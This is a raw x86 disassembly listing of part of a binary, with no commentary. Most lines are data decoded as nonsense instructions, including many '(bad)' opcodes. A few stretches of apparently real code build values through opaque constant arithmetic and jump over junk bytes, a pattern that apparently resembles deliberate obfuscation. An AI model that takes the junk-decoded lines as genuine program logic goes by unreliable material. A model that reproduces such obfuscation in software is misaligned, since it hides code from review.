  40efb3:	inc    ebp
  40efb4:	and    BYTE PTR [ebx-0x722e97ed],dl
  40efba:	push   ecx
  40efbb:	or     esi,DWORD PTR [ebx+eiz*1-0x2a]
  40efbf:	push   ss
  40efc0:	stos   BYTE PTR es:[edi],al
  40efc1:	add    eax,0x69a858d0
  40efc6:	and    eax,0xa1b08e48
  40efcb:	adc    eax,0xdb12310c
  40efd0:	outs   dx,BYTE PTR ds:[esi]
  40efd1:	xchg   edx,eax
  40efd2:	int    0xce
  40efd4:	push   ds
  40efd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efd6:	cli    
  40efd7:	add    esp,ebp
  40efd9:	inc    edx
  40efda:	call   0x4fc2:0x39a33a19
  40efe1:	bound  ebp,QWORD PTR [ecx-0x5c]
  40efe4:	add    BYTE PTR [ebp-0x2],ch
  40efe7:	cmp    ebx,DWORD PTR [ebp+0x62]
  40efea:	jg     0x40effd
  40efec:	cmp    DWORD PTR [esi-0x2f],0x1f
  40eff0:	cmp    dl,dh
  40eff2:	sbb    BYTE PTR ds:0x61a9be80,0x6b
  40eff9:	pop    ss
  40effa:	jnp    0x40ef9b
  40effc:	push   esp
  40effd:	jmp    0x8f78:0x153e4ad0
  40f004:	and    al,0x6b
  40f006:	inc    ebx
  40f007:	and    edx,esi
  40f009:	js     0x40f034
  40f00b:	hlt    
  40f00c:	cwde   
  40f00d:	inc    edx
  40f00e:	imul   eax,DWORD PTR [edx+esi*1],0x4e
  40f012:	nop
  40f013:	aad    0x13
  40f015:	mov    dh,BYTE PTR [esi-0x713b4844]
  40f01b:	dec    esp
  40f01c:	fmul   DWORD PTR [edx+0x7a6c4a1]
  40f022:	mov    dl,BYTE PTR [ecx-0x3a992866]
  40f028:	rcl    BYTE PTR [ebx+ebp*8+0x4b137236],cl
  40f02f:	inc    ebp
  40f030:	inc    edi
  40f031:	xchg   ebx,eax
  40f032:	(bad)  
  40f033:	pop    eax
  40f034:	add    ebp,DWORD PTR [edi]
  40f036:	xor    ah,BYTE PTR [esi]
  40f038:	imul   ecx,DWORD PTR [ebx+esi*1-0x1fb65f4d],0xffffffa9
  40f040:	mov    eax,0xc3b206d8
  40f045:	cwde   
  40f046:	or     eax,0x1db27dd5
  40f04b:	xchg   BYTE PTR [edi],ah
  40f04d:	push   es
  40f04e:	and    edx,eax
  40f050:	test   eax,0x5e17822e
  40f055:	outs   dx,DWORD PTR ds:[esi]
  40f056:	mov    ebp,0x58a0e144
  40f05b:	shr    DWORD PTR [ecx],cl
  40f05d:	jbe    0x40f027
  40f05f:	shr    BYTE PTR [edi],cl
  40f061:	and    ah,BYTE PTR [eax+0x62b44bea]
  40f067:	dec    esi
  40f068:	clc    
  40f069:	xchg   DWORD PTR [esi],esp
  40f06b:	sub    eax,0x67ca30d5
  40f070:	mov    ch,0x71
  40f072:	sub    DWORD PTR [ecx],ecx
  40f074:	sub    esi,DWORD PTR [ecx+0x30a0756b]
  40f07a:	mov    edi,0x1ec61e4b
  40f07f:	jbe    0x40f089
  40f081:	into   
  40f082:	pop    ss
  40f083:	adc    dl,al
  40f085:	jne    0x40e793
  40f08b:	pop    edi
  40f08c:	jmp    0x40f350
  40f091:	inc    edi
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0x740c:0xaa146552
  40f09f:	jg     0x40f051
  40f0a1:	jo     0x40f051
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [eax+0x412fb76c],dh
  40f0ae:	stos   DWORD PTR es:[edi],eax
  40f0af:	jl     0x40f040
  40f0b1:	jg     0x40f10e
  40f0b3:	push   ecx
  40f0b4:	loop   0x40f0da
  40f0b6:	sub    eax,DWORD PTR [esi-0x2a3be5b3]
  40f0bc:	js     0x40f062
  40f0be:	not    DWORD PTR [eax+0x19fec650]
  40f0c4:	sub    al,0xe0
  40f0c6:	fidiv  WORD PTR [esi-0x1]
  40f0c9:	das    
  40f0ca:	rol    dh,cl
  40f0cc:	mov    dl,0x99
  40f0ce:	adc    ecx,DWORD PTR es:[esi+esi*1-0x19]
  40f0d3:	adc    BYTE PTR [ecx+0x41fa5377],dl
  40f0d9:	jle    0x40f08a
  40f0db:	out    dx,eax
  40f0dc:	jne    0x40f0fd
  40f0de:	popf   
  40f0df:	pop    es
  40f0e0:	dec    edi
  40f0e1:	xor    eax,ecx
  40f0e3:	ss add eax,0x872c77e0
  40f0e9:	jae    0x40f0e2
  40f0eb:	and    esp,DWORD PTR [ecx+0x338a53c]
  40f0f1:	test   BYTE PTR [ebx-0x11],bh
  40f0f4:	and    al,0x89
  40f0f6:	xchg   esp,eax
  40f0f7:	pop    ss
  40f0f8:	mov    ds:0xe090c876,eax
  40f0fd:	fs test eax,0xed6a135b
  40f103:	sbb    DWORD PTR [edx+0x3c6133be],ebx
  40f109:	test   ebp,eax
  40f10b:	xlat   BYTE PTR ds:[ebx]
  40f10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10d:	dec    esi
  40f10e:	mov    dh,0xf8
  40f110:	pop    eax
  40f111:	ss popf 
  40f113:	xchg   BYTE PTR [edx+0x18b2a36c],dl
  40f119:	push   ebx
  40f11a:	pop    es
  40f11b:	mov    al,0x94
  40f11d:	loope  0x40f117
  40f11f:	pop    ebx
  40f120:	push   ecx
  40f121:	sub    BYTE PTR [edi+0x76],dl
  40f124:	dec    ebx
  40f125:	shl    ebx,0x8d
  40f128:	lea    edx,[edi+0x56922327]
  40f12e:	push   eax
  40f12f:	les    edi,FWORD PTR [edx]
  40f131:	mov    esp,fs
  40f133:	out    0xfd,eax
  40f135:	mov    ds,WORD PTR [ecx+0x494ef672]
  40f13b:	sub    al,0xee
  40f13d:	dec    eax
  40f13e:	xchg   ecx,eax
  40f13f:	clc    
  40f140:	(bad)  
  40f142:	repz xor eax,0x626f2afb
  40f148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f149:	add    cl,BYTE PTR [edx-0x62d6774]
  40f14f:	dec    edi
  40f150:	out    0x7a,eax
  40f152:	retf   
  40f153:	xchg   esp,eax
  40f154:	mov    dl,0xc1
  40f156:	xchg   edx,eax
  40f157:	xchg   ecx,eax
  40f158:	add    eax,0xc8dbf297
  40f15d:	xor    esi,ecx
  40f15f:	shl    DWORD PTR [ebp+0x22],cl
  40f162:	fbld   TBYTE PTR [ebp-0x2d1457db]
  40f168:	pop    es
  40f169:	push   esi
  40f16a:	push   0x8f2c0b82
  40f16f:	fcom   QWORD PTR [edx]
  40f171:	mov    ch,0xa3
  40f173:	cs adc bh,al
  40f176:	std    
  40f177:	cmp    BYTE PTR [esi],dh
  40f179:	frstor [edi]
  40f17b:	hlt    
  40f17c:	sbb    ebx,esi
  40f17e:	pop    esi
  40f17f:	cmp    al,0x10
  40f181:	jge    0x40f19e
  40f183:	inc    esp
  40f184:	arpl   WORD PTR [eax-0x46],bx
  40f187:	out    dx,al
  40f188:	in     al,0x7c
  40f18a:	pop    edx
  40f18b:	xlat   BYTE PTR ds:[ebx]
  40f18c:	xchg   BYTE PTR [ebp-0x4b646b5e],dh
  40f192:	loopne 0x40f174
  40f194:	std    
  40f195:	add    bl,BYTE PTR [esi+edx*8-0x78]
  40f199:	cmp    al,0x57
  40f19c:	and    DWORD PTR [eax-0x718f59ef],esi
  40f1a2:	push   esp
  40f1a3:	addr16 cs icebp 
  40f1a6:	pop    ebx
  40f1a7:	ds cli 
  40f1a9:	inc    edi
  40f1aa:	sub    dl,BYTE PTR [ebx+0x4fd188e2]
  40f1b0:	and    ax,0x4a6
  40f1b4:	fcmovu st,st(3)
  40f1b6:	mov    dl,dl
  40f1b8:	stos   BYTE PTR es:[edi],al
  40f1b9:	mov    cl,0x76
  40f1bb:	xlat   BYTE PTR ds:[ebx]
  40f1bc:	lds    esi,FWORD PTR [edi+0x6027f5f1]
  40f1c2:	or     dh,al
  40f1c4:	inc    ecx
  40f1c5:	sti    
  40f1c6:	push   ecx
  40f1c7:	mov    al,0x30
  40f1c9:	sub    esp,esp
  40f1cb:	mov    ch,BYTE PTR [edi]
  40f1cd:	scas   al,BYTE PTR es:[edi]
  40f1ce:	(bad)  
  40f1cf:	pop    ebp
  40f1d0:	outs   dx,BYTE PTR ds:[esi]
  40f1d1:	and    ecx,DWORD PTR [ebp+0x6c]
  40f1d4:	and    eax,0xd4f139a1
  40f1d9:	mov    al,0xd1
  40f1db:	ss mov bh,0xeb
  40f1de:	add    eax,0xe7d428fc
  40f1e3:	popa   
  40f1e4:	(bad)  
  40f1e6:	outs   dx,BYTE PTR ds:[esi]
  40f1e7:	mov    bh,0x98
  40f1e9:	mov    es,WORD PTR [edi+0x56]
  40f1ec:	hlt    
  40f1ed:	into   
  40f1ee:	out    0x63,eax
  40f1f0:	pushf  
  40f1f1:	pusha  
  40f1f2:	inc    ebp
  40f1f3:	push   ebp
  40f1f4:	sbb    DWORD PTR [eax+0x5d],0x6b
  40f1f8:	push   ecx
  40f1f9:	out    0xb7,al
  40f1fb:	rol    BYTE PTR [ebx-0x2df32457],1
  40f201:	inc    ebx
  40f202:	(bad)  
  40f203:	and    dh,ch
  40f205:	jecxz  0x40f1b0
  40f207:	inc    ebx
  40f208:	adc    bl,al
  40f20a:	pushf  
  40f20b:	or     cl,BYTE PTR [edi-0x376468b6]
  40f211:	lea    ecx,ds:[ebp+0x7a066c39]
  40f218:	in     eax,0x50
  40f21a:	adc    eax,0x64a745d1
  40f21f:	sar    BYTE PTR [ebp+0x255ba288],cl
  40f225:	mov    eax,0x2beffa08
  40f22a:	pop    edi
  40f22b:	sbb    DWORD PTR [edx],esp
  40f22d:	aam    0xbf
  40f22f:	xor    al,0x2c
  40f231:	rol    DWORD PTR [ecx+0x4a],0x5e
  40f235:	adc    DWORD PTR [ebx-0x10],eax
  40f238:	fisub  DWORD PTR [ecx-0x3497b5e9]
  40f23e:	ficomp WORD PTR [edi]
  40f240:	ds popf 
  40f242:	out    dx,eax
  40f243:	mov    dl,0x22
  40f245:	retf   0x245c
  40f248:	or     DWORD PTR [ecx+0x6460e383],0x8f7d4d44
  40f252:	inc    esi
  40f253:	xchg   ecx,eax
  40f254:	add    DWORD PTR [esi-0x20265f94],ebp
  40f25a:	retf   
  40f25b:	ja     0x40f2b2
  40f25d:	sar    bl,0x48
  40f260:	push   ds
  40f261:	push   ebx
  40f262:	mov    fs,WORD PTR [esi-0x15456897]
  40f268:	and    eax,0xbcb987b8
  40f26d:	lock adc BYTE PTR [ebx-0x6b53bbc4],ch
  40f274:	(bad)  
  40f275:	jno    0x40f2e3
  40f277:	dec    edx
  40f278:	push   cs
  40f279:	jne    0x40f22a
  40f27b:	dec    edx
  40f27c:	arpl   WORD PTR [edi],bx
  40f27e:	pop    es
  40f27f:	scas   al,BYTE PTR es:[edi]
  40f280:	mov    bh,BYTE PTR [edi-0xf]
  40f283:	dec    esp
  40f284:	(bad)  
  40f285:	out    0x76,eax
  40f287:	mov    ch,0x1
  40f289:	ror    ah,cl
  40f28b:	dec    esi
  40f28c:	pop    esp
  40f28d:	int    0x1
  40f28f:	push   edx
  40f290:	js     0x40f305
  40f292:	sbb    eax,0x76c43198
  40f297:	mov    eax,0xf23c6b14
  40f29c:	jo     0x40f258
  40f29e:	fld    TBYTE PTR [eax]
  40f2a0:	dec    bx
  40f2a2:	iret   
  40f2a3:	popa   
  40f2a4:	mov    ds:0x658e80b1,al
  40f2a9:	pop    eax
  40f2aa:	daa    
  40f2ab:	in     eax,0xde
  40f2ad:	adc    dl,BYTE PTR [ebp-0x9c6c5c7]
  40f2b3:	cmp    BYTE PTR [ecx+0x40fcdebc],0x43
  40f2ba:	pop    edx
  40f2bb:	data16 xor al,0x8c
  40f2be:	pop    ebp
  40f2bf:	nop
  40f2c0:	add    al,0xf8
  40f2c2:	(bad)  
  40f2c3:	dec    ecx
  40f2c4:	cwde   
  40f2c5:	cmc    
  40f2c6:	mov    WORD PTR [edi],ds
  40f2c8:	ret    
  40f2c9:	loop   0x40f317
  40f2cb:	ret    
  40f2cc:	push   ebp
  40f2cd:	and    DWORD PTR [ecx+0x5a],edx
  40f2d0:	xchg   edi,eax
  40f2d1:	mov    al,ds:0x4d4b5dff
  40f2d6:	dec    ebx
  40f2d7:	ss jge 0x40f2dc
  40f2da:	jecxz  0x40f343
  40f2dc:	jmp    0x8e622afe
  40f2e1:	mov    WORD PTR [esi-0x59],cs
  40f2e4:	cli    
  40f2e5:	jne    0x40f35e
  40f2e7:	adc    DWORD PTR [edi],ebp
  40f2e9:	test   al,0x44
  40f2eb:	out    dx,eax
  40f2ec:	mov    ch,0x6f
  40f2ee:	int3   
  40f2ef:	push   ecx
  40f2f0:	ja     0x40f2d4
  40f2f2:	test   DWORD PTR [ebx-0x5c61ec34],ebp
  40f2f8:	or     ebp,ebp
  40f2fa:	or     eax,0x62779be0
  40f2ff:	(bad)  
  40f300:	imul   BYTE PTR [ecx+0x6a]
  40f303:	lahf   
  40f304:	dec    esi
  40f305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f306:	xlat   BYTE PTR ds:[ebx]
  40f307:	mov    edx,0x2bb5a9fe
  40f30c:	pusha  
  40f30d:	(bad)  
  40f30e:	mov    al,ds:0x7da2be8
  40f313:	in     al,0xa8
  40f315:	stc    
  40f316:	pop    es
  40f317:	mov    ?,WORD PTR [ebx-0x3ce5b575]
  40f31d:	mov    esp,0xdb803d52
  40f322:	retf   
  40f323:	xor    esp,DWORD PTR [ecx]
  40f325:	or     BYTE PTR [ecx-0x3f],bl
  40f328:	jnp    0x40f34e
  40f32a:	outs   dx,BYTE PTR ds:[esi]
  40f32b:	loop   0x40f336
  40f32d:	or     ebx,DWORD PTR [edx+0x2a]
  40f330:	inc    ebx
  40f331:	or     bl,ch
  40f333:	sbb    BYTE PTR [edi],dh
  40f335:	in     al,dx
  40f336:	ror    dh,0x59
  40f339:	xchg   dh,bh
  40f33b:	fadd   QWORD PTR ds:0xbe4cd788
  40f341:	adc    al,0x13
  40f343:	push   ds
  40f344:	cmp    DWORD PTR ds:0x417b48bd,ebx
  40f34a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f34b:	jle    0x40f3b8
  40f34d:	mov    ch,0xb1
  40f34f:	mov    ebx,DWORD PTR [esi+0x5b]
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x1e
  40f384:	sbb    DWORD PTR [edi+0x70],0x2b
  40f388:	test   al,0x18
  40f38a:	sbb    BYTE PTR [esi+0x67181814],bh
  40f390:	mov    dh,0x33
  40f392:	cs dec esp
  40f394:	sub    BYTE PTR [ecx+ebx*8],dh
  40f397:	jo     0x40f3a1
  40f399:	mov    cl,0x3d
  40f39b:	and    al,al
  40f39d:	retf   
  40f39e:	sub    ch,dh
  40f3a0:	cmp    DWORD PTR [edx+0x18d4b9ba],0xe3049f24
  40f3aa:	ficomp DWORD PTR [ebp+0xf]
  40f3ad:	xchg   ecx,eax
  40f3ae:	xchg   ebx,eax
  40f3af:	push   edi
  40f3b0:	adc    edx,DWORD PTR [ebx+0x1e]
  40f3b3:	fst    DWORD PTR [ebx+0x767218ac]
  40f3b9:	and    BYTE PTR [ebp-0x3a],bl
  40f3bc:	loop   0x40f39c
  40f3be:	retf   
  40f3bf:	cmp    al,BYTE PTR [edx-0x717b8879]
  40f3c5:	ja     0x40f3d5
  40f3c7:	ret    
  40f3c8:	mov    eax,ds:0x35a8d560
  40f3cd:	cmp    al,0x6
  40f3cf:	jne    0x40f3ef
  40f3d1:	in     al,dx
  40f3d2:	xor    eax,0xbd473283
  40f3d7:	inc    edi
  40f3d8:	out    dx,eax
  40f3d9:	cmp    eax,DWORD PTR [edx+0xb]
  40f3dc:	test   al,0x37
  40f3de:	call   0x39256f25
  40f3e3:	call   0x8113d942
  40f3e8:	xchg   edx,eax
  40f3e9:	lahf   
  40f3ea:	pop    ebx
  40f3eb:	test   DWORD PTR [esi+ecx*1-0x61],edi
  40f3ef:	fwait
  40f3f0:	test   DWORD PTR [ecx+0xe9a20bf],edx
  40f3f6:	scas   eax,DWORD PTR es:[edi]
  40f3f7:	sub    eax,0x4a0b08e4
  40f3fc:	mov    eax,0xf7f71137
  40f401:	inc    ebp
  40f402:	sub    eax,0xb727544e
  40f407:	cmp    DWORD PTR [edi+0x3e],0x7a
  40f40b:	enter  0xb150,0x23
  40f40f:	xor    edx,ecx
  40f411:	pop    ecx
  40f412:	pusha  
  40f413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f414:	inc    edi
  40f415:	popa   
  40f416:	sub    edi,ebx
  40f418:	sti    
  40f419:	sub    ebx,esp
  40f41b:	mov    ebx,0x6bdb7836
  40f420:	cmp    dl,BYTE PTR [ebx-0x3a]
  40f423:	xor    al,0x52
  40f425:	mov    DWORD PTR [edx-0x592b2673],esp
  40f42b:	arpl   WORD PTR [esi-0x37],cx
  40f42e:	lods   eax,DWORD PTR ds:[esi]
  40f42f:	out    0x1b,eax
  40f431:	sbb    cl,bl
  40f433:	add    DWORD PTR [ebx+edi*8],esi
  40f436:	jb     0x40f4a2
  40f438:	pop    eax
  40f439:	(bad)  
  40f43a:	xchg   ebp,eax
  40f43b:	stos   DWORD PTR es:[edi],eax
  40f43c:	mov    ch,ah
  40f43e:	inc    ecx
  40f43f:	leave  
  40f440:	lods   al,BYTE PTR ds:[esi]
  40f441:	and    al,BYTE PTR [edx]
  40f443:	int    0xd
  40f445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f446:	adc    DWORD PTR [ecx],0xca3f2d35
  40f44c:	clc    
  40f44d:	push   ecx
  40f44e:	or     BYTE PTR [ecx-0x754575e7],ch
  40f454:	cmp    al,0xac
  40f456:	leave  
  40f457:	adc    DWORD PTR [ebx],ebp
  40f459:	add    al,ch
  40f45b:	mov    dh,0x67
  40f45d:	adc    ebp,edx
  40f45f:	pop    eax
  40f460:	sub    DWORD PTR [edi-0x3b1e1f90],edx
  40f466:	test   eax,0xba5469
  40f46b:	mov    BYTE PTR [ecx],al
  40f46d:	es and al,0x42
  40f470:	std    
  40f471:	aas    
  40f472:	sub    al,0xfd
  40f474:	(bad)  [esi]
  40f476:	push   es
  40f477:	adc    al,0xd6
  40f479:	jnp    0x40f49e
  40f47b:	pop    ds
  40f47c:	stc    
  40f47d:	or     DWORD PTR [edx+0x7],0x9e9b24d0
  40f484:	fxch   st(5)
  40f486:	imul   esi,ebx,0x5c
  40f489:	mov    eax,ds:0x573be5fa
  40f48e:	jo     0x40f4c3
  40f490:	dec    eax
  40f491:	ds test eax,0x6b65161c
  40f497:	rol    BYTE PTR [eax+0x66],cl
  40f49a:	dec    esi
  40f49b:	fisttp QWORD PTR [edx-0x547cf27f]
  40f4a1:	iret   
  40f4a2:	sub    eax,0xdcae657d
  40f4a7:	jbe    0x40f466
  40f4a9:	mov    eax,ds:0x33d4b73
  40f4ae:	mov    edx,DWORD PTR [esi]
  40f4b0:	xlat   BYTE PTR ds:[ebx]
  40f4b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b2:	cmp    eax,0xd9acc05d
  40f4b7:	sbb    eax,DWORD PTR [edi]
  40f4b9:	push   edi
  40f4ba:	and    DWORD PTR [edx],ecx
  40f4bc:	mov    WORD PTR [ecx],?
  40f4be:	loopne 0x40f453
  40f4c0:	xor    esi,DWORD PTR [ecx-0x20]
  40f4c3:	sbb    bl,BYTE PTR [edx]
  40f4c5:	outs   dx,BYTE PTR ds:[esi]
  40f4c6:	inc    esp
  40f4c7:	lods   al,BYTE PTR ds:[esi]
  40f4c8:	xchg   DWORD PTR [esi-0x3b],esi
  40f4cb:	dec    edi
  40f4cc:	outs   dx,DWORD PTR ds:[esi]
  40f4cd:	mov    ds:0x3f514fe4,al
  40f4d2:	jbe    0x40f4f8
  40f4d4:	pusha  
  40f4d5:	jp     0x40f51b
  40f4d7:	jno    0x40f54d
  40f4d9:	rol    DWORD PTR [eax+0x47],1
  40f4dc:	out    dx,al
  40f4dd:	adc    DWORD PTR [eiz*1-0x17bc50b1],esi
  40f4e4:	xchg   esi,eax
  40f4e5:	add    eax,0x7caa96cd
  40f4ea:	lock xor ch,bl
  40f4ed:	loop   0x40f50e
  40f4ef:	loop   0x40f530
  40f4f1:	cdq    
  40f4f2:	rcl    BYTE PTR [ebp-0x24996be0],1
  40f4f8:	out    dx,eax
  40f4f9:	fsub   QWORD PTR [eax-0x28]
  40f4fc:	mov    DWORD PTR [ebp-0x1fe691a7],esp
  40f502:	sar    DWORD PTR [esi],cl
  40f504:	xor    BYTE PTR [ecx+0x3804cb1],ah
  40f50a:	nop
  40f50b:	xchg   edi,eax
  40f50c:	and    al,0x19
  40f50e:	dec    eax
  40f50f:	dec    ebp
  40f510:	retf   0x508
  40f513:	clc    
  40f514:	fcom   QWORD PTR [eax-0x58303ad1]
  40f51a:	call   0xc870130e
  40f51f:	cmova  esi,esi
  40f522:	and    BYTE PTR [eax-0x60806b2],cl
  40f528:	jb     0x40f56e
  40f52a:	out    dx,al
  40f52b:	and    edi,eax
  40f52d:	inc    eax
  40f52e:	jmp    0x40f524
  40f530:	mov    esp,0x520c907
  40f535:	jmp    0xef8f:0x5beb000c
  40f53c:	rcr    edi,cl
  40f53e:	test   BYTE PTR [edi],ch
  40f540:	ror    BYTE PTR [edi],0x75
  40f543:	mov    ah,0x76
  40f545:	fisub  WORD PTR [esi+eax*8+0x788f6e5e]
  40f54c:	sub    eax,0x876afd79
  40f551:	scas   eax,DWORD PTR es:[edi]
  40f552:	sub    dh,ch
  40f554:	fdivrp st(6),st
  40f556:	push   edi
  40f557:	jmp    0x30bc9587
  40f55c:	mov    esi,0x76447519
  40f561:	jmp    0x2cb3:0xd4163304
  40f568:	ja     0x40f553
  40f56a:	inc    edx
  40f56b:	or     eax,0xafbbcb22
  40f570:	and    BYTE PTR [edx-0x38],ah
  40f573:	addr16 leave 
  40f575:	pop    ecx
  40f576:	je     0x40f55b
  40f578:	add    esi,ecx
  40f57a:	mov    edx,0x430907e9
  40f57f:	push   0x50
  40f581:	pusha  
  40f582:	fsub   QWORD PTR [eax-0x3fe38fc0]
  40f588:	daa    
  40f589:	mov    esp,0xd54c23aa
  40f58e:	pop    ebx
  40f58f:	pushf  
  40f590:	fwait
  40f591:	imul   edx,ebp,0x75171689
  40f597:	stos   DWORD PTR es:[edi],eax
  40f598:	mov    al,0x8c
  40f59a:	add    dl,BYTE PTR [esi]
  40f59c:	ror    ebp,cl
  40f59e:	push   es
  40f59f:	sahf   
  40f5a0:	into   
  40f5a1:	pop    ecx
  40f5a2:	sub    BYTE PTR ds:0xd28cabc7,bl
  40f5a8:	add    eax,0x4c40e11c
  40f5ad:	sub    DWORD PTR [esi],ebp
  40f5af:	adc    edx,esi
  40f5b1:	push   eax
  40f5b2:	pop    esp
  40f5b3:	add    BYTE PTR [edx+0x1c8cf627],bl
  40f5b9:	adc    DWORD PTR [edi-0x33c76f60],esi
  40f5bf:	xchg   ebp,eax
  40f5c0:	je     0x40f597
  40f5c2:	(bad)  
  40f5c4:	enter  0xf63c,0xe4
  40f5c8:	sub    dh,BYTE PTR [edi-0x1d]
  40f5cb:	(bad)  
  40f5cc:	push   esi
  40f5cd:	mov    ds:0xdb32b7f8,al
  40f5d2:	ror    DWORD PTR ds:[edi+0x65],0x3f
  40f5d7:	retf   
  40f5d8:	mov    bl,0x6a
  40f5da:	cmp    edx,DWORD PTR [ebx]
  40f5dc:	inc    eax
  40f5dd:	daa    
  40f5de:	xchg   ebx,eax
  40f5df:	scas   ax,WORD PTR es:[edi]
  40f5e1:	push   esi
  40f5e2:	add    BYTE PTR [eax-0x5e],dh
  40f5e5:	inc    eax
  40f5e6:	ret    0x12d6
  40f5e9:	mov    ?,WORD PTR [edi-0x6c]
  40f5ec:	sar    BYTE PTR [ecx-0x1f51c0a6],0x9e
  40f5f3:	cmp    ecx,ebp
  40f5f5:	div    edi
  40f5f7:	jns    0x40f662
  40f5f9:	scas   al,BYTE PTR es:[edi]
  40f5fa:	aad    0x87
  40f5fc:	push   eax
  40f5fd:	mov    esi,eax
  40f5ff:	inc    esi
  40f600:	shr    DWORD PTR ss:[esi+0x26],0x58
  40f605:	push   ebx
  40f606:	cmp    bx,WORD PTR [edx+ebx*4+0x18a2b2e3]
  40f60e:	pop    edx
  40f60f:	xlat   BYTE PTR ds:[ebx]
  40f610:	rol    BYTE PTR [edx+0x4a],cl
  40f613:	adc    al,0x8e
  40f615:	pop    ss
  40f616:	fs pop ebp
  40f618:	daa    
  40f619:	test   DWORD PTR [eax],esp
  40f61b:	push   es
  40f61c:	inc    eax
  40f61d:	stos   BYTE PTR es:[edi],al
  40f61e:	paddq  mm2,QWORD PTR [esi+0x2d]
  40f622:	inc    esi
  40f623:	jmp    0x40f5d2
  40f625:	dec    ecx
  40f626:	(bad)  
  40f627:	mov    ah,0x34
  40f629:	les    esi,FWORD PTR fs:[edx+0x57dfd6f0]
  40f630:	shl    DWORD PTR [edi+0x3d],1
  40f633:	inc    esi
  40f634:	mov    ebp,0xf6f05a0d
  40f639:	pop    ds
  40f63a:	adc    bh,dl
  40f63c:	push   0x8bbd235f
  40f641:	dec    ebp
  40f642:	clc    
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422518
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42264c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x41ffc92e],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	fldcw  WORD PTR [ecx-0x51]
  40f734:	clc    
  40f735:	cmp    esp,esp
  40f737:	dec    esp
  40f738:	arpl   WORD PTR [edx+ebx*8+0x20f612bd],sp
  40f73f:	mov    dl,BYTE PTR [ebx+0x2c]
  40f742:	pop    edx
  40f743:	push   es
  40f744:	sub    al,0xc2
  40f746:	repz cli 
  40f748:	std    
  40f749:	leave  
  40f74a:	mov    al,ds:0x6f97fd8b
  40f74f:	daa    
  40f750:	jg     0x40f717
  40f752:	sahf   
  40f753:	xor    DWORD PTR [ebx-0x5d],ebp
  40f756:	imul   ecx
  40f758:	inc    esi
  40f759:	dec    ebp
  40f75a:	fimul  WORD PTR [ebx+eax*4]
  40f75d:	ret    0xfffc
  40f760:	push   ds
  40f761:	(bad)  
  40f762:	mov    dh,0xc2
  40f764:	adc    eax,0x77ad7f49
  40f769:	repnz inc eax
  40f76b:	xor    al,0xfc
  40f76e:	push   eax
